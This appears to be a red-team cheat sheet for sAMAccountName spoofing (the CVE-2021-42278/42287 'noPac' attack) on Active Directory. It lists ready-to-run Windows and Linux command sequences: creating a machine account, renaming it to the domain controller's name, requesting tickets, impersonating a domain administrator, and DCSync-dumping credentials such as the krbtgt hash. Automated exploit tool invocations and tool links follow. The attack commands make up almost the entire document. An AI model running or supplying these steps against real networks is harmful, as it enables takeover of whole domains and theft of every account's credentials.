# sAMAccountName spoofing

## Windows

# add computer account
New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newPassword>' -AsPlainText -Force)

# set serviceprincipalname to empty value
Set-DomainObject -Identity <newComputer> -Clear serviceprincipalname

# change sAMAccountName to Domain Controllers name without trailing $
Set-MachineAccountAttribute -MachineAccount "<newComputer>" -Value "<dcNo$>" -Attribute samaccountname -Verbose

# request a TGT for new computer account
Rubeus.exe asktgt /user:"<dcNo$>" /password:"<newPassword>" /domain:"<domain>" /dc:"<fqdnDc>" /nowrap

# reset the controlled machine account sAMAccountName to its old value
Set-MachineAccountAttribute -MachineAccount "dcNo$" -Value "<newComputer>" -Attribute samaccountname -Verbose

# obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"<domainAdmin>" /altservice:"cifs/<fqdnDc>" /dc:"<fqdnDc>" /ptt /ticket:<base64>

# dcsync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /kdc:<fqdnDc> /user:<targetUser>"'

# automatic - receive TGT of vulnerable domain controller
.\noPac.exe scan -domain <domain> -user <user> -pass <password>

## Linux

# add computer account
impacket-addcomputer -computer-name '<newComputer>' -computer-pass '<newComputerPassword>' -dc-ip <dcIp> '<domain>/<user>:<password>'

# set serviceprincipalname to empty value
impacket-addspn -u '<domain>\<user>' -p '<password>' -t '<newComputer>' -dc-ip <dcIp>

# change sAMAccountName to Domain Controllers name without trailing $
renameMachine -current-name '<newComputer$>' -new-name '<domainController>' -dc-ip <dcIp> '<domain>/<user>:<password>'

# request a TGT for new computer account
impacket-getTGT -dc-ip <dcIp> '<domain>/<domainController>:<newComputerPassword>'

# reset the controlled machine account sAMAccountName to its old value
renameMachine -current-name '<domainController>' -new-name '<newComputer$>' -dc-ip <dcIp> '<domain>/<user>:<password>'

# obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='domainController.ccache' impacket-GetST -self -impersonate '<targetAdmin>' -spn 'cifs/<domainController>.<domain>' -k -no-pass -dc-ip <dcIp> '<domain>'/'<domainController>'

# dcsync
KRB5CCNAME='targetAdmin.ccache' impacket-secretsdump -just-dc-user 'krbtgt' -k -no-pass -dc-ip <dcIp> @<fqdn>

# automatic - receive TGT of vulnerable domain controller
python noPac.py <domain>/<user>:<password> -dc-ip <dcIp>

# References
https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
https://github.com/cube0x0/noPac
https://github.com/Ridter/noPac
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1
https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1
https://raw.githubusercontent.com/SecureAuthCorp/impacket/b4fbcf9196e9b6098edae0ae7794005d2e138ccd/examples/renameMachine.py
https://www.cvedetails.com/cve/CVE-2021-42278
https://www.cvedetails.com/cve/CVE-2021-42287
https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

